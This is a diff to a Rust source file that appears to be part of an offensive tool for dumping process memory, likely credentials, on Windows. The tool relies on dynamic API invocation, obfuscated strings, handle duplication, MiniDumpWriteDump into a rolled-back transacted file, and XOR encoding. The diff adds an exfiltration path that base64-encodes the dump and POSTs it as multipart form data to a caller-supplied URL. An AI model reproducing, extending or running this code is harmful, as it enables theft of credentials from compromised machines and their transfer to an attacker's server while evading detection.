@@ -4,20 +4,22 @@
 extern crate litcrypt;
 use_litcrypt!();
 
+extern crate base64;
+
 use litcrypt::lc;
 use rand::{thread_rng, Rng};
 use rand::distributions::Alphanumeric;
 use core::panic;
+use std::io::Cursor;
 use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
 use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
-use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransactio, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile, NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE, SetHandleInformation};
+use data::{CreateFileMapping, CreateFileTransactedA, CreateTransaction, GetFileSize, MapViewOfFile, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PAGE_READONLY, PVOID, QueryFullProcessImageNameW, RollbackTransaction, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, UnmapViewOfFile, NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE, SetHandleInformation};
 
 static mut STATIC_HANDLE: isize = 0;
 
-// #[no_mangle]
-// pub extern "Rust" fn
-pub fn dump(key: &str) {
-
+//#[no_mangle]
+ //pub extern "Rust" fn dump(key: &str) {
+pub fn dump(key: &str, url: &str) {
     unsafe 
     {
         let privilege: u32 = 20; 
@@ -448,18 +450,52 @@ pub fn dump(key: &str) {
                                             view_ptr = view_ptr.add(1);
                                         }
 
-
                                         let rand_string: String = thread_rng()
+                                        .sample_iter(&Alphanumeric)
+                                        .take(7)
+                                        .map(char::from)
+                                        .collect();
+
+                                        if url == ""
+                                        {
+
+                                            let file_name = format!("{}{}", rand_string, ".txt");
+                                            let mut file = std::fs::File::create(&file_name).unwrap();
+                                            let _r = file.write(&view_xor).unwrap();
+
+                                            println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());
+
+                                        }
+                                        else
+                                        {
+                                            let rand_boundary: String = thread_rng()
                                             .sample_iter(&Alphanumeric)
-                                            .take(7)
+                                            .take(16)
                                             .map(char::from)
                                             .collect();
 
-                                        let file_name = format!("{}{}", rand_string, ".txt");
-                                        let mut file = std::fs::File::create(&file_name).unwrap();
-                                        let _r = file.write(&view_xor).unwrap();
+                                            let boundary: &str = &format!("{},{}", "------------------------", rand_boundary);
+                                            let mut data = Vec::new();
+                                            let _ = write!(data, "--{}\r\n", boundary);
+                                            let _ = write!(data, "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n", rand_string);
+                                            let _ = write!(data, "Content-Type: text/plain\r\n");
+                                            let _ = write!(data, "\r\n");
+    
+                                            let _ = write!(data, "{}", base64::encode(&view_xor));
+                                            let _ = write!(data, "\r\n"); // The key thing you are missing
+                                            let _ = write!(data, "--{}--\r\n", boundary);
+    
+                                            let read = Cursor::new(&data);
+                                            let cont_type = format!("multipart/form-data; boundary={}", boundary);
+                                            //let client = reqwest::Client::new(); 
+                                            let _ = ureq::post(url)
+                                                .set("content-type",cont_type.as_str()) 
+                                                .set("Content-Length", data.len().to_string().as_str())
+                                                //.body(data) 
+                                                .send(read);
 
-                                        println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());
+                                            println!("{}", &lc!("[+] File uploaded."));
+                                        }
 
                                         let func: UnmapViewOfFile;
                                         let ret2: Option<BOOL>;
@@ -477,7 +513,7 @@ pub fn dump(key: &str) {
                                         }
 
 
-                                        let func: RollbackTransactio;
+                                        let func: RollbackTransaction;
                                         let ret: Option<BOOL>;
                                         dinvoke::dynamic_invoke!(
                                             ktmv,
